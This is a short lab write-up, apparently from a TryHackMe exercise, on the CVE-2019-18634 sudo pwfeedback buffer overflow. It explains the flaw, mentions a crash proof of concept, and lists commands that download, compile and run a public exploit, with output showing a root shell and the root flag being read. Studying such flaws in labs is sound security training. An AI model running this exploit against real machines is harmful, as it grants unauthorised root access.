# CVE-2019-18634 Sudo Buffer Overflow
- sudo version < 1.8.26.
- exploit option called **pwfeedback**.


# pwfeedback
- turned off by default (with the exception of ElementaryOS and Linux Mint)
- pwfeedback makes it so that whenever you type a character, an asterisk `*` is displayed on the screen.
- Inside the /etc/sudoers file it is specified like this (when option is turned on):
![pwfeedback](pic/pwfeedback-demo.png)

it's possible to perform a buffer overflow attack on the sudo command. when a program accepts input from a user it stores the data in a set size of storage space. A buffer overflow attack is when you enter so much data into the input that it spills out of this storage space and into the next "box," overwriting the data in it.


this means if we fill the password box of the sudo command up with a *lot of garbage*, we can inject our own stuff in at the end. This could mean that we get a shell as root! **This exploit works regardless of whether we have any sudo permissions to begin with**, unlike in [CVE-2019-14287](sudovulnsbypass.md) where we had to have a very specific set of permissions in the first place.


Simple POC
![poc](pic/capture-1.png)

Perl to generate a lot of information which we're then passing into the sudo command as a password using the `pipe (|) operator`. Notice that this doesn't actually give us root permissions -- instead it shows us an error message: `Segmentation fault`, which basically means that we've tried to access some memory that we weren't supposed to be able to access. This proves that a buffer overflow vulnerability exists: now we just need to exploit it!


# action
```console
$ wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
$ gcc -o exploit exploit.c
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# whoami
root
# cat /root/root.txt
```